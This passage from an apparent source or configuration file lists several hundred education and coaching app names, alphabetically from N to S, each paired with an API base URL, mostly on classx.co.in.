    ("Nishantsenglish", "https://nishantsenglishapi.classx.co.in"),
    ("Nishchayacademy", "https://nishchayacademyapi.classx.co.in"),
    ("Nishchayiasacademy", "https://nishchayiasacademyapi.classx.co.in"),
    ("Nishtha", "https://nishthaapi.classx.co.in"),
    ("Nishthainstitute", "https://nishthainstituteapi.classx.co.in"),
    ("Niteshsir", "https://niteshsirapi.classx.co.in"),
    ("Nitinsharmamaths", "https://nitinsharmamathsapi.classx.co.in"),
    ("Nobelforensics", "https://nobelforensicsapi.classx.co.in"),
    ("Notebook", "https://notebookapi.classx.co.in"),
    ("Notebookacademy", "https://d1ftpn76h259sr.cloudfront.net"),
    ("Nscareeracademy", "https://nscareeracademyapi.classx.co.in"),
    ("Nskp", "https://nskpapi.classx.co.in"),
    ("Nst", "https://nstapi.classx.co.in"),
    ("Numbersacademy", "https://numbersacademyapi.classx.co.in"),
    ("Nurseasy", "https://nurseasyapi.classx.co.in"),
    ("Nursingtest", "https://nursingtestapi.classx.co.in"),
    ("Nurtureclassesjeeneetboard", "https://nurtureclassesapi.classx.co.in"),
    ("Ocean", "https://oceangurukulsapi.classx.co.in"),
    ("Odiaspacegovtexampreparationapp", "https://odiaspaceapi.classx.co.in"),
    ("Odinsacademy", "https://odinsacademyapi.classx.co.in"),
    ("Odishaexam", "https://odishaexamapi.classx.co.in"),
    ("Odishaexamnew", "https://newodishaexamapi.classx.co.in"),
    ("Olympiadwinner", "https://olympiadwinnerapi.classx.co.in"),
    ("Olympicstudy", "https://olympicstudyapi.classx.co.in"),
    ("Omeducation", "https://omeducationapi.classx.co.in"),
    ("Omtrivediclassesotc", "https://omtrivediclassesapi.classx.co.in"),
    ("Omvisionacademy", "https://omvisionacademyapi.classx.co.in"),
    ("Onedayghar", "https://onedaygharapi.classx.co.in"),
    ("Onekstudy", "https://onekstudyapi.classx.co.in"),
    ("Onlineagriculture", "https://onlineagricultureapi.classx.co.in"),
    ("Onlineclassacademy", "https://onlineclassacademyapi.classx.co.in"),
    ("Onlineeducationapp", "https://onlineeducationapi.classx.co.in"),
    ("Onlinelearning", "https://onlinelearningapi.classx.co.in"),
    ("Onlineolearnonline", "https://onlineolearnonlineanytimeapi.classx.co.in"),
    ("Onlineprep", "https://onlineprepapi.classx.co.in"),
    ("Onlinestudyplatform", "https://onlinestudyplatformapi.classx.co.in"),
    ("Onlinestudypoint", "https://onlinestudypointapi.classx.co.in"),
    ("Onlinestudyzone", "https://onlinestudyzoneapi.classx.co.in"),
    ("Onlinetestbook", "https://onlinetestbookapi.classx.co.in"),
    ("Onlykhakimission", "https://onlykhakimissionapi.classx.co.in"),
    ("Onlystudy", "https://onlystudyapi.classx.co.in"),
    ("Onlytopstudy", "https://onlytopstudyapi.classx.co.in"),
    ("Ooacademypune", "https://ooacademypuneapi.classx.co.in"),
    ("Openstudy", "https://openstudyapi.teachx.in"),
    ("Openstudy_", "https://openstudyapi.classx.co.in"),
    ("Optimum", "https://optimumapi.classx.co.in"),
    ("Oraontvjh", "https://oraontvjhapi.classx.co.in"),
    ("Orjaat", "https://orjaatapi.classx.co.in"),
    ("Osnacademy", "https://osnacademyapi.classx.co.in"),
    ("Ourdreammerry", "https://ourdreammerryapi.classx.co.in"),
    ("Ourseducation", "https://ourseducationapi.classx.co.in"),
    ("Ovimet", "https://ovimetapi.classx.co.in"),
    ("Oxfordgsaacademyjaipur", "https://oxfordgsaacademyjaipurapi.classx.co.in"),
    ("Pacificmarineacademy", "https://pacificmarineacademyapi.classx.co.in"),
    ("Padhle", "https://padhleapi.classx.co.in"),
    ("Padhleakshay", "https://padhleakshayapi.classx.co.in"),
    ("Padhoabhiyan", "https://padhoabhiyanapi.classx.co.in"),
    ("Padhreclasses", "https://padhreclassesapi.classx.co.in"),
    ("Padhreiitjam", "https://padhreiitjamapi.classx.co.in"),
    ("Pahelieduplus", "https://pahelieduplusapi.classx.co.in"),
    ("Paidefenceacademy", "https://paidefenceacademyapi.classx.co.in"),
    ("Palakiasacademy", "https://palakiasacademyapi.classx.co.in"),
    ("Panaceaforssc", "https://panaceaforsscapi.classx.co.in"),
    ("Pancholi", "https://acharyaclassesapi.appx.co.in"),
    ("Panchrishiclasses", "https://panchrishiclassesapi.classx.co.in"),
    ("Pandeyjitechnical", "https://pandeyjitechnicalapi.classx.co.in"),
    ("Pankajstudycentre", "https://pankajstudycentreapi.classx.co.in"),
    ("Panoramabykamleshsir", "https://panoramakamleshsirapi.classx.co.in"),
    ("Pantheonedu", "https://pantheoneduapi.classx.co.in"),
    ("Paperhacker", "https://paperhackerapi.classx.co.in"),
    ("Papertickacademy", "https://papertickacademyapi.classx.co.in"),
    ("Parakramacademy", "https://parakramacademyapi.classx.co.in"),
    ("Paramedicalclasses", "https://paramedicalclassesapi.classx.co.in"),
    ("Pareeksharthi", "https://pareeksharthiapi.classx.co.in"),
    ("Pariksha247", "https://pariksha247api.classx.co.in"),
    ("Parikshadham", "https://parikshadhamapi.classx.co.in"),
    ("Parikshagyan", "https://parikshagyanapi.classx.co.in"),
    ("Parikshamunch", "https://parikshamunchapi.classx.co.in"),
    ("Parikshaone", "https://parikshaoneapi.classx.co.in"),
    ("Parikshaplus", "https://parikshaplusapi.classx.co.in"),
    ("Parikshaportal", "https://parikshaportalapi.classx.co.in"),
    ("Parishramupscgpsc", "https://parishramupscgpscapi.classx.co.in"),
    ("Pariskhastudy24", "https://pariskhastudy24api.classx.co.in"),
    ("Parivartanmpscupsc", "https://parivartanmpscupscapi.classx.co.in"),
    ("Parmaracademy", "https://parmaracademyapi.classx.co.in"),
    ("Pashaseconomy20", "https://pashaseconomy20api.classx.co.in"),
    ("Passionenglishstudy", "https://passionenglishstudyapi.classx.co.in"),
    ("Patanjaliiasacademy", "https://patanjaliiasacademyapi.classx.co.in"),
    ("Pathakclasses", "https://pathakclassesapi.classx.co.in"),
    ("Pathshala247Examprep", "https://pathshala247examprepapi.classx.co.in"),
    ("Patiya", "https://patiyaapi.classx.co.in"),
    ("Pavandeshpandesacademy", "https://pavandeshpandeacademyapi.classx.co.in"),
    ("Pawansirbettiah", "https://pawansirbettiahapi.classx.co.in"),
    ("Pcdigital", "https://pcdigitalapi.classx.co.in"),
    ("Pcepanacea", "https://panaceacompetitiveexaminationsapi.classx.co.in"),
    ("Pcmbacademy", "https://pcmbacademyapi.classx.co.in"),
    ("Pcsmantra", "https://pcsmantraapi.teachx.in"),
    ("Pcsmantra_", "https://pcsmantraapi.classx.co.in"),
    ("Pdsharmaclasses", "https://pdsharmaclassesapi.classx.co.in"),
    ("Pearlnirmaanclassespnc", "https://pearlnirmaanclassesapi.classx.co.in"),
    ("Pediatricsbydranand", "https://pediatricsdranandapi.classx.co.in"),
    ("Perainstitutepune", "https://perainstitutepuneapi.classx.co.in"),
    ("Perfectcomputerengineer", "https://perfectcomputerengineerapi.classx.co.in"),
    ("Perfectioniasacademy", "https://perfectioniasacademyapi.classx.co.in"),
    ("Perfectswing", "https://perfectswingapi.classx.co.in"),
    ("Perspectiveacademy", "https://perspectiveacademyapi.classx.co.in"),
    ("Pesphankareducationservices", "https://pesphankareducationservicesapi.classx.co.in"),
    ("Pgcambd", "https://pgcambdapi.classx.co.in"),
    ("Pgpointlive", "https://pgpointliveapi.classx.co.in"),
    ("Pharmacadgpatnipermba", "https://pharmacadapi.classx.co.in"),
    ("Pharmacyindia", "https://pharmacyindiaapi.classx.co.in"),
    ("Pharmacypoint", "https://pharmacypointapi.classx.co.in"),
    ("Phoenixacademy", "https://phoenixacademyapi.classx.co.in"),
    ("Phonefixhyd", "https://phonefixhydapi.classx.co.in"),
    ("Phonixacadmy", "https://studypiapi.appx.co.in"),
    ("Photonclasses", "https://photonclassesapi.classx.co.in"),
    ("Physicasingh", "https://physicsasinghsirapi.classx.co.in"),
    ("Physicsbyniteshsir", "https://physicsniteshsirapi.classx.co.in"),
    ("Physicsbypankajsir", "https://physicspankajsirapi.classx.co.in"),
    ("Physicsbysanjaysir", "https://physicssanjaysirapi.classx.co.in"),
    ("Physicsbyshubhamtyagi", "https://physicsshubhamtyagiapi.classx.co.in"),
    ("Physicsfakira", "https://physicsfakiraapi.classx.co.in"),
    ("Physicsgravity", "https://physicsgravityapi.classx.co.in"),
    ("Physicsguru", "https://physicsguruapi.classx.co.in"),
    ("Physicsheistbyprofessor", "https://physicsheistprofessorapi.classx.co.in"),
    ("Physicsmagician", "https://physicsmagicianapi.classx.co.in"),
    ("Physicsmagicianweb", "https://physicsmagicianwebapi.classx.co.in"),
    ("Physicsprobyaksir", "https://physicsproaksirapi.classx.co.in"),
    ("Physicstour", "https://physicstourapi.classx.co.in"),
    ("Physicswithumeshrajoria", "https://physicsumeshrajoriaapi.classx.co.in"),
    ("Pioneeracademy", "https://pioneeracademyapi.classx.co.in"),
    ("Pkagriacademy", "https://pkagriacademyapi.classx.co.in"),
    ("Pksirmaths", "https://pksirmathsapi.classx.co.in"),
    ("Plaintospeak", "https://plaintospeakapi.classx.co.in"),
    ("Planetspike", "https://planetspikeapi.classx.co.in"),
    ("Platform", "https://d2zv7casldjvbj.cloudfront.net"),
    ("Pnextlive", "https://pnextliveapi.classx.co.in"),
    ("Policefactory", "https://policefactoryapi.classx.co.in"),
    ("Polytechnicacademy", "https://polytechnicacademyapi.classx.co.in"),
    ("Polytechnicpathshala", "https://polytechnicpathshalaapi.classx.co.in"),
    ("Powerofprotrading", "https://powerofprotradingapi.classx.co.in"),
    ("Powl", "https://powlapi.classx.co.in"),
    ("Prabalprofessionalacademy", "https://prabalprofessionalacademyapi.classx.co.in"),
    ("Prabhav", "https://prabhavapi.classx.co.in"),
    ("Prabodhfoundation", "https://prabodhfoundationapi.classx.co.in"),
    ("Pracademy", "https://pracademyapi.classx.co.in"),
    ("Prachandprayaspvtltd", "https://prachandprayaspvtltdapi.classx.co.in"),
    ("Practicebook", "https://practicebookapi.classx.co.in"),
    ("Pradeepgirisir", "https://pradeepgiriapi.classx.co.in"),
    ("Pradeepkagat", "https://pradeepkagatapi.classx.co.in"),
    ("Pradhitclassesliveclassespdf", "https://pradhitclassesliveclassespdfapi.classx.co.in"),
    ("Pragaticlassesudaipur", "https://pragaticlassesudaipurapi.classx.co.in"),
    ("Pragaticoaching", "https://pragaticoachingapi.classx.co.in"),
    ("Pragyaeducation", "https://pragyaeducationapi.classx.co.in"),
    ("Prajadefence", "https://prajadefenceapi.classx.co.in"),
    ("Prakashinstitute", "https://prakashinstituteapi.classx.co.in"),
    ("Prakashsirmaths", "https://prakashsirmathsapi.classx.co.in"),
    ("Prakhar", "https://prakharapi.classx.co.in"),
    ("Pramakhilclasses", "https://pramakhilclassesapi.classx.co.in"),
    ("Pramodsarangclasses", "https://pramodsarangclassesapi.classx.co.in"),
    ("Prasadacademyofficial", "https://prasadacademyofficialapi.classx.co.in"),
    ("Prashantchaturvedi", "https://prashantchaturvediapi.classx.co.in"),
    ("Prashareducare", "https://prashareducareapi.classx.co.in"),
    ("Pratapacademy", "https://pratapacademyapi.classx.co.in"),
    ("Pratapcampus", "https://pratapcampusapi.classx.co.in"),
    ("Prathamacademy", "https://prathamacademyapi.classx.co.in"),
    ("Pratigyaclasses", "https://pratigyaclassesapi.classx.co.in"),
    ("Pratigyaclassesjodhpur", "https://pratigyaclassesjodhpurapi.classx.co.in"),
    ("Pratigyalearningapp", "https://pratigyalearningappapi.classx.co.in"),
    ("Pratikbhad", "https://pratikbhadapi.classx.co.in"),
    ("Pratiyogitaghatnachakra", "https://pratiyogitaghatnachakraapi.classx.co.in"),
    ("Pravinchormalesmasterclass", "https://pravinchormalesmasterclassapi.classx.co.in"),
    ("Pravinkadsclasses", "https://pravinkadsclassesapi.classx.co.in"),
    ("Prayagfoundationindore", "https://prayagfoundationindoreapi.classx.co.in"),
    ("Prayagiasacademy", "https://prayagiasacademyapi.classx.co.in"),
    ("Prayagrajgsresearchcenter", "https://prayagrajgsresearchcenterapi.classx.co.in"),
    ("Prayasinstitute", "https://prayasinstituteapi.classx.co.in"),
    ("Prayasinstituteofagriculture", "https://prayasinstituteofagricultureapi.classx.co.in"),
    ("Prbankingadda", "https://prbankingaddaapi.classx.co.in"),
    ("Prepfusion", "https://prepfusionapi.classx.co.in"),
    ("Prepgyan", "https://prepgyanapi.classx.co.in"),
    ("Prepkar", "https://prepkarapi.classx.co.in"),
    ("Primepostalacademy", "https://primepostalacademyapi.classx.co.in"),
    ("Primeprofessionalclassesppc", "https://primeprofessionalclassesppcapi.classx.co.in"),
    ("Princedefenceacademy", "https://princedefenceacademyapi.classx.co.in"),
    ("Prishaias", "https://prishaiasapi.classx.co.in"),
    ("Priyeshsirvidyapeeth", "https://priyeshsirvidyapeethapi.classx.co.in"),
    ("Proeduhut", "https://proeduhutapi.classx.co.in"),
    ("Professionalcommerce", "https://professionalcommerceapi.classx.co.in"),
    ("Profinserv", "https://profinservapi.classx.co.in"),
    ("Proggapon", "https://proggaponapi.classx.co.in"),
    ("Provekarexam", "https://provekarexamapi.classx.co.in"),
    ("Psc", "https://pscmantraapi.classx.co.in"),
    ("Psibaba", "https://psibabaapi.classx.co.in"),
    ("Psychologytrading", "https://psychologytradingapi.classx.co.in"),
    ("Ptech", "https://ptechapi.classx.co.in"),
    ("Ptscadexpert", "https://ptscadexpertapi.classx.co.in"),
    ("Pulseaiims", "https://pulseaiimsapi.classx.co.in"),
    ("Puneetsirreasoning", "https://puneetsirreasoningapi.classx.co.in"),
    ("Purnaeducare", "https://purnaeducareapi.classx.co.in"),
    ("Purplehat", "https://purplehatapi.classx.co.in"),
    ("Qualitypluseducation", "https://qualitypluseducationapi.classx.co.in"),
    ("Quantachemistry", "https://quantachemistryapi.teachx.in"),
    ("Quantachemistryofficial", "https://quantachemistryapi.classx.co.in"),
    ("Quantapoint", "https://quantapointapi.classx.co.in"),
    ("Quantezy", "https://quantezyapi.classx.co.in"),
    ("Quickermaths", "https://quickermathsapi.classx.co.in"),
    ("Quizmaster", "https://quizmasterapi.classx.co.in"),
    ("R2Cacademy", "https://r2cacademyapi.classx.co.in"),
    ("Radhekrishnaacademyeducationapp", "https://radhekrishnaacademyeducationappapi.classx.co.in"),
    ("Radhinaquants", "https://radhinaquantsapi.classx.co.in"),
    ("Raghuramsacademy", "https://raghuramsacademyapi.classx.co.in"),
    ("Rahi", "https://rahiappapi.classx.co.in"),
    ("Rahmaniayurveda", "https://rahmaniayurvedaapi.classx.co.in"),
    ("Rahmanpathan", "https://rahmanpathanapi.classx.co.in"),
    ("Rahuldeshwalacademytoptak", "https://rahuldeshwalacademyapi.classx.co.in"),
    ("Rahulscienceacademy", "https://rahulscienceacademyapi.classx.co.in"),
    ("Railwayadda24", "https://railwayadda24api.classx.co.in"),
    ("Raithan", "https://raithanapi.classx.co.in"),
    ("Rajasthan360", "https://rajasthan360api.classx.co.in"),
    ("Rajclassesbansur", "https://rajclassesbansurapi.classx.co.in"),
    ("Rajeevacademy", "https://rajeevacademyapi.classx.co.in"),
    ("Rajeshbharate", "https://rajeshbharateapi.classx.co.in"),
    ("Rajfashionmaker", "https://rajfashionmakerapi.classx.co.in"),
    ("Rajhansshorthandclasses", "https://rajhansshorthandclassesapi.classx.co.in"),
    ("Rajkumarbandalsacademy", "https://rajkumarbandalsacademyapi.classx.co.in"),
    ("Rajmudraiasacademy", "https://rajmudraiasacademyapi.classx.co.in"),
    ("Rajmudralatur", "https://rajmudralaturapi.classx.co.in"),
    ("Rajnishsharmaclasses", "https://rajnishsharmaclassesapi.classx.co.in"),
    ("Rajpootananotes", "https://rajpootananotesapi.classx.co.in"),
    ("Rajsevaclasses", "https://rajsevaclassesapi.classx.co.in"),
    ("Rakeshsirmathsclasses", "https://rakeshsirmathsclassesapi.classx.co.in"),
    ("Rakshitsingh", "https://rakshitsinghapi.classx.co.in"),
    ("Ramaiahcoaching", "https://ramaiahcoachingapi.classx.co.in"),
    ("Ramanshugs", "https://ramanshugsclassesapi.classx.co.in"),
    ("Ramasgurukul", "https://ramasgurukulapi.classx.co.in"),
    ("Rambanacademy", "https://rambanacademyapi.classx.co.in"),
    ("Ramdasshrikrushnawaghaakarupscmpsc", "https://ramdasshrikrushnawaghapi.classx.co.in"),
    ("Ramdevcareerclasses", "https://ramdevcareerclassesapi.classx.co.in"),
    ("Ramjikipathshala", "https://ramjikipathshalaapi.classx.co.in"),
    ("Ramnarayan", "https://ramnarayanapi.classx.co.in"),
    ("Ramnivassirmaths", "https://ramnivassirmathsapi.classx.co.in"),
    ("Ramsirstudy", "https://ramsirstudyapi.classx.co.in"),
    ("Ranjitmathematicsclasses", "https://ranjitmathematicsclassesapi.classx.co.in"),
    ("Rankers_appx", "https://rankersapi.appx.co.in"),
    ("Rankers", "https://rankersapi.classx.co.in"),
    ("Rankersdefenceacademy", "https://rankerdefenceapi.classx.co.in"),
    ("Rankersiq", "https://rankersiqapi.classx.co.in"),
    ("Rankupeducation", "https://rankupeducationapi.classx.co.in"),
    ("Raoscareerinstitute", "https://raocareerinstituteapi.classx.co.in"),
    ("Rasbabadeepaksir", "https://rasbabadeepaksirapi.classx.co.in"),
    ("Rathodonlineacademy", "https://rathodonlineacademyapi.classx.co.in"),
    ("Rationalacademy", "https://rationalacademyupapi.classx.co.in"),
    ("Ratnaifoundation", "https://ratnaifoundationapi.classx.co.in"),
    ("Rattaeducation", "https://rattaeducationapi.classx.co.in"),
    ("Rautsiruniqueacademyyavatmal", "https://rautsiruniqueacademyyavatmalapi.classx.co.in"),
    ("Ravacademyformpscupsc", "https://ravacademyapi.classx.co.in"),
    ("Ravideduplus", "https://ravideduplusapi.classx.co.in"),
    ("Ravidfmaudiobooklearning", "https://ravidfmaudiobooklearningapi.classx.co.in"),
    ("Ravindrababuravula", "https://ravindrababuravulaapi.classx.co.in"),
    ("Ravinkipathshala", "https://ravinpathshalaapi.classx.co.in"),
    ("Rayalanandagopalonlineacademy", "https://rayalanandagopalonlineacademyapi.classx.co.in"),
    ("Rayatprabodhiniofficial", "https://rayatprabodhiniofficialapi.classx.co.in"),
    ("Rbe", "https://revolutioneducationapi.teachx.in"),
    ("Rcmathematics", "https://rcmathematicsapi.classx.co.in"),
    ("Rdmglobalstudies", "https://rdmglobalstudiesapi.classx.co.in"),
    ("Realknowledgeworld", "https://realknowledgeworldapi.classx.co.in"),
    ("Realstudy", "https://realstudyapi.classx.co.in"),
    ("Reasoningbypulkitsir", "https://reasoningpulkitapi.classx.co.in"),
    ("Reasoningbypuransir", "https://reasoningpuransirapi.classx.co.in"),
    ("Reasoningguru", "https://reasoningguruapi.classx.co.in"),
    ("Reasoninglife", "https://reasoninglifeapi.classx.co.in"),
    ("Reasoningrunway", "https://reasoningrunwayrspailwarapi.classx.co.in"),
    ("Reasoningwallah", "https://reasoningwallahapi.classx.co.in"),
    ("Recevaacademy", "https://racevaacademyapi.classx.co.in"),
    ("Reliableacademyhigher", "https://reliableacademyhigherapi.classx.co.in"),
    ("Reliableofficer", "https://reliableofficerapi.classx.co.in"),
    ("Resonanceias", "https://resonanceiasapi.classx.co.in"),
    ("Restartias", "https://restartiasapi.classx.co.in"),
    ("Resultguru", "https://resultguruapi.classx.co.in"),
    ("Resultmitra", "https://resultmitraapi.classx.co.in"),
    ("Revisersacademy", "https://revisersacademyapi.classx.co.in"),
    ("Revolutionbyeducation", "https://revolutioneducationapi.classx.co.in"),
    ("Rglectures", "https://rglecturesapi.classx.co.in"),
    ("Rgvikramjeet", "https://rgvikramjeetapi.classx.co.in"),
    ("Rhchemistry", "https://rhchemistryapi.classx.co.in"),
    ("Riseacademy", "https://riseacademyapi.classx.co.in"),
    ("Rishamamlearningcentre", "https://rishamamlearningcentreapi.classx.co.in"),
    ("Ritustudypoint", "https://ritustudypointapi.classx.co.in"),
    ("Rjcbtnursing", "https://rjcbtnursingapi.classx.co.in"),
    ("Rjinstitute", "https://rjinstituteapi.classx.co.in"),
    ("Rjstudypoint", "https://rjstudypointapi.classx.co.in"),
    ("Rkracademy", "https://rkracademyapi.classx.co.in"),
    ("Rksirenglish", "https://rksirenglishapi.classx.co.in"),
    ("Rksirofficial", "https://rksirofficialapi.classx.co.in"),
    ("Rktutorialofficial", "https://rktutorialofficialapi.classx.co.in"),
    ("Rlc", "https://rlcapi.classx.co.in"),
    ("Rmc", "https://rmcapi.classx.co.in"),
    ("Rmcprofithouse", "https://rmcprofithouseapi.classx.co.in"),
    ("Rnsstudies", "https://rnsstudiesapi.classx.co.in"),
    ("Robustlearning", "https://robustlearningapi.classx.co.in"),
    ("Rohitnegi", "https://rohitnegiapi.classx.co.in"),
    ("Rohitvaidwannotes", "https://rohitvaidwannotesapi.classx.co.in"),
    ("Rojgarrunwaycareerinstitute", "https://rojgarrunwaycareerinstituteapi.classx.co.in"),
    ("Rojgarsagar", "https://rojgarsagarapi.classx.co.in"),
    ("Rojgarsetu", "https://rojgarsetuapi.classx.co.in"),
    ("Rojgarwithankit", "https://rozgarapinew.teachx.in"),
    ("Rojgarwithsubhash", "https://rojgarwithsubhashapi.classx.co.in"),
    ("Roshangaurgsclasses", "https://roshangaurgsclassesapi.classx.co.in"),
    ("Roydsircareerhit", "https://roydsircareerhitapi.classx.co.in"),
    ("Rpconcept", "https://rpconceptapi.classx.co.in"),
    ("Rpscnotes", "https://rpscnotesapi.classx.co.in"),
    ("Rracademy", "https://rracademyapi.classx.co.in"),
    ("Rrcampus", "https://rrcampusapi.classx.co.in"),
    ("Rsbrailwayexams", "https://rsbrailwayexamsapi.classx.co.in"),
    ("Rsclasses", "https://rsclassesapi.classx.co.in"),
    ("Rslearningplatform", "https://rslearningplatformapi.classx.co.in"),
    ("Rssdigital", "https://rssdigitalapi.classx.co.in"),
    ("Rudraacademy", "https://rudraacademyapi.classx.co.in"),
    ("Rukminieducationcenter", "https://rukminieducationcenterapi.classx.co.in"),
    ("Rvmanushistudy", "https://rvmanushistudyapi.classx.co.in"),
    ("Saarthieducation", "https://saarthieducationapi.classx.co.in"),
    ("Saarthimentor", "https://saarthimentorapi.classx.co.in"),
    ("Saarthispk", "https://saarthispkapi.classx.co.in"),
    ("Sachin", "https://sachinacademyapi.classx.co.in"),
    ("Sachindhawalesmathsandreasoningacademy", "https://sachindhawaleapi.classx.co.in"),
    ("Sachingaikwadte", "https://sachingaikwadteamapi.classx.co.in"),
    ("Sachinwarulkar", "https://sachinwarulkarapi.classx.co.in"),
    ("Sadhyaacademy", "https://sadhyaacademyapi.classx.co.in"),
    ("Safalacademyforgpsc", "https://safalacademyforgpscapi.classx.co.in"),
    ("Safalsteps", "https://safalstepsapi.classx.co.in"),
    ("Safaltabyprashantsir", "https://safaltaprashantsirapi.classx.co.in"),
    ("Safaltaexpress", "https://safaltaexpressapi.classx.co.in"),
    ("Safaltamanthan247", "https://safaltamanthan247api.classx.co.in"),
    ("Safaltaschool", "https://safaltaschoolapi.classx.co.in"),
    ("Safaltatestseriesacademy", "https://safaltatestseriesacademyapi.classx.co.in"),
    ("Sagarcompetitiveacademy", "https://sagarcompetitiveacademyapi.classx.co.in"),
    ("Sagarmathematics", "https://sagarmathematicsapi.classx.co.in"),
    ("Sagarsindhuridlc", "https://sagarsindhuridlcapi.classx.co.in"),
    ("Sagaryadavmathsindore", "https://sagaryadavmathsindoreapi.classx.co.in"),
    ("Sahadevchoudhary", "https://hindisahadevchoudharyapi.classx.co.in"),
    ("Sahilsir", "https://quicktrickssahilsirapi.classx.co.in"),
    ("Sahityaacademy", "https://sahityaacademyapi.classx.co.in"),
    ("Sahityasangamonlineclasses", "https://sahityasangamonlineclassesapi.classx.co.in"),
    ("Sahityatheliterature", "https://sahityatheliteratureapi.classx.co.in"),
    ("Sahyadriacademybaramati", "https://sahyadriacademybaramatiapi.classx.co.in"),
    ("Sahyadriias", "https://sahyadriiasapi.classx.co.in"),
    ("Sahyadritestseriesbaramati", "https://sahyadritestseriesbaramatiapi.classx.co.in"),
    ("Saiacademy", "https://saiacademyapi.classx.co.in"),
    ("Saigangabooks", "https://saigangaapi.classx.co.in"),
    ("Saimedhaecet", "https://saimedhaecetapi.classx.co.in"),
    ("Saimedhagate", "https://saimedhagateapi.classx.co.in"),
    ("Saimedhajlm", "https://saimedhajlmapi.classx.co.in"),
    ("Saimedhaunity", "https://saimedhaunityapi.classx.co.in"),
    ("Sakarforum", "https://sakarforumapi.classx.co.in"),
    ("Salesforceandinterviews", "https://salesforceandinterviewsapi.classx.co.in"),
    ("Salesforcegeek", "https://salesforcegeekapi.classx.co.in"),
    ("Samadhankokate", "https://samadhankokatepolityapi.classx.co.in"),
    ("Samarthacademy", "https://samarthacademyapi.classx.co.in"),
    ("Samayak", "https://samyakapi.teachx.in"),
    ("Samikshainstitute", "https://samikshainstituteapi.classx.co.in"),
    ("Samyak", "https://samyakapi.classx.co.in"),
    ("Sandeepjyani", "https://sandeepjyanicivilengineeringapi.classx.co.in"),
    ("Sandeepsirclasses", "https://sandeepsirclassesapi.classx.co.in"),
    ("Sandeshwithravisir", "https://sandeshravisirapi.classx.co.in"),
    ("Sandipargadesinstitute", "https://sandipargadeinstituteapi.classx.co.in"),
    ("Sangarshparivar", "https://sangharshparivarapi.classx.co.in"),
    ("Sangharshacademyapppbn", "https://sangharshacademyapppbnapi.classx.co.in"),
    ("Sangharshindia", "https://sangharshindiaapi.classx.co.in"),
    ("Sanjaychemtutorial", "https://sanjaychemtutorialapi.classx.co.in"),
    ("Sanjaypahadesmathsreasoningacademy", "https://sanjaypahademathsreasoningacademyapi.classx.co.in"),
    ("Sanjayvighnefutureofficer", "https://sanjayvighnefutureofficerapi.classx.co.in"),
    ("Sanjeevkijani", "https://sanjeevkijaniapi.classx.co.in"),
    ("Sankalp", "https://sankalpcoachingganganagarapi.classx.co.in"),
    ("Sankalp_appx", "https://sankalpclassesapi.appx.co.in"),
    ("Sankalp2447", "https://sankalp2447api.classx.co.in"),
    ("Sankalpacademy", "https://sankalpacademyapi.classx.co.in"),
    ("Sankalpclasses", "https://sankalpclassesapi.classx.co.in"),
    ("Sankalpclassesmsp", "https://sankalpclassesmspapi.classx.co.in"),
    ("Sankalptrinity", "https://sankalptrinityapi.classx.co.in"),
    ("Sanketsirgs", "https://sanketsirgscentreapi.classx.co.in"),
    ("Sankhokun", "https://sankhokunapi.classx.co.in"),
    ("Sanskritganga", "https://sanskritganganewapi.classx.co.in"),
    ("Sanskritsamriddhi", "https://sanskritsamriddhiapi.appx.co.in"),
    ("Sanskritsannidhyam", "https://sanskritsannidhyamapi.classx.co.in"),
    ("Sanskrutiaryagurukulam", "https://sanskrutiaryagurukulamapi.classx.co.in"),
    ("Santsirclasses", "https://santsirclassesapi.classx.co.in"),
    ("Saptrangnursecarrieracademy", "https://saptrangnursecarrieracademyapi.classx.co.in"),
    ("Saraakash", "https://saraakashapi.classx.co.in"),
    ("Saraswatacademy", "https://saraswatacademyapi.classx.co.in"),
    ("Sarkarigurukul", "https://sarkarigurukulapi.classx.co.in"),
    ("Sarkarimasterofficial", "https://sarkarimasterofficialapi.classx.co.in"),
    ("Sarkarinaukari", "https://sarkarinaukariapi.classx.co.in"),
    ("Sarkarinaukriwale", "https://sarkarinaukriwaleapi.classx.co.in"),
    ("Sarokarshikshansansthan", "https://sarokarshikshansansthanapi.classx.co.in"),
    ("Sartazclasses", "https://sartazclassesapi.classx.co.in"),
    ("Sarthakclassespaota", "https://sarthakclassespaotaapi.classx.co.in"),
    ("Sarthiacademyakns", "https://sarthiacademyaknsapi.classx.co.in"),
    ("Sarthidigitalclassroom", "https://sarthidigitalclassroomapi.classx.co.in"),
    ("Sarthisupportdigitalclass", "https://sarthisupportdigitalclassapi.classx.co.in"),
    ("Sarvodayaacademy", "https://sarvodayaacademyschoolcompetitiveexamapi.classx.co.in"),
    ("Sarvodayaacademyrajasthan", "https://sarvodayaacademyrajasthanapi.classx.co.in"),
    ("Sarvodayaonline", "https://sarvodayaonlineapi.classx.co.in"),
    ("Sateeshenglishmethodologylogics", "https://sateeshenglishmethodologylogicsapi.classx.co.in"),
    ("Satendrasiasacademy", "https://satendraiasapi.classx.co.in"),
    ("Satendrasir", "https://satendrasirclassesapi.classx.co.in"),
    ("Satishscienceacademy", "https://satishscienceacademyapi.classx.co.in"),
    ("Satvalearningapp", "https://satvalearningappapi.classx.co.in"),
    ("Satyadisharma", "https://satyadhisharmaclassesapi.classx.co.in"),
    ("Satyamclassesgorakhpur", "https://satyamclassesgorakhpurapi.classx.co.in"),
    ("Satyarthinstitute", "https://satyarthinstituteapi.classx.co.in"),
    ("Saurabhsirclasses", "https://saurabhsirclassesapi.classx.co.in"),
    ("Savarncoaching", "https://savarncoachingapi.classx.co.in"),
    ("Savijayiasdelhi", "https://savijayiasapi.classx.co.in"),
    ("Sbexamexamscrackapp", "https://sbexamexamscrackappapi.classx.co.in"),
    ("Sbsuccessbymallikarjunasir", "https://sbsuccessbymallikarjunasirapi.classx.co.in"),
    ("Sbsuccesspoint", "https://sbsuccesspointapi.classx.co.in"),
    ("Sbtechmathacademy", "https://sbtechmathapi.classx.co.in"),
    ("Scholarscareeracademy", "https://scholarscareeracademyapi.classx.co.in"),
    ("Schoolingmantra", "https://schoolingmantraapi.classx.co.in"),
    ("Scienceacademy", "https://scienceacademyapi.classx.co.in"),
    ("Scienceacademybyaarifsir", "https://scienceacademyaarifsirapi.classx.co.in"),
    ("Sciencebyanilkotle", "https://scienceanilkotleapi.classx.co.in"),
    ("Sciencebypriya", "https://sciencepriyamaamapi.classx.co.in"),
    ("Sciencefun", "https://sciencefunapi.classx.co.in"),
    ("Scienceplus", "https://scienceplusapi.classx.co.in"),
    ("Sciencesamrajya", "https://sciencesamrajyaapi.classx.co.in"),
    ("Sciencesangrah", "https://sciencesangrahapi.classx.co.in"),
